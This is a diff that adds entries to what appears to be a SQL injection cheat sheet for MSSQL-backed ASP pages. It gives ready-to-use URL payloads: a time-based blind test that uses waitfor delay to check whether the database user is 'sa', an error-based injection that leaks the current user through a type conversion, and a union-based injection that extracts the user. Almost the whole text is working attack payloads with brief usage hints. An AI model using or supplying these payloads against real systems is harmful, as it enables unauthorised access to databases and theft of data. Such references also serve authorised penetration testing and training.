@@ -115,3 +115,24 @@
 
 -----
 
+
+#### blind queries
+
+*if not 'sa' wait for 10 seconds*
+
+```http://target.com/page.asp?id=1;if+not(select+system_user)+<>+'sa'+waitfor+delay+'0:0:10'--```
+
+-----
+
+
+#### mssql
+
+*error based, extract user*
+
+```http://target.com/page.asp?id=1 or 1=convert(int,(USER))--```
+
+*union based extract user (use null where data type not known, column number must match)*
+
+```http://target.com/page.asp?id=null UNION SELECT ALL 1,USER,3,4--```
+
+-----
